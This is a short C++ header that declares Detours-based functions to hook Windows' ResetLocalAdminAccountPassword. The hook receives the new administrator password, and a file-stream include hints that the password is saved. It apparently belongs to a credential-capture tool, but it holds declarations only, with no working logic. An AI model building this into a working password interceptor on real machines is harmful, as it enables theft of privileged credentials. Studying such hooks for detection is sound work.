#pragma once
#pragma comment(lib, "detours.lib")
#include <fstream>
#define WIN32_LEAN_AND_MEAN             // Exclude rarely-used stuff from Windows headers

BOOL AttachHook();
BOOL DetachHook();

typedef LONG(WINAPI* pResetLocalAdminAccountPassword)(LPVOID, LPVOID, LPCWSTR, LPVOID);
extern pResetLocalAdminAccountPassword ResetLocalAdminAccountPassword;

LONG  HookResetLocalAdminAccountPassword(LPVOID param1, LPVOID param2, LPCWSTR password, LPVOID param4);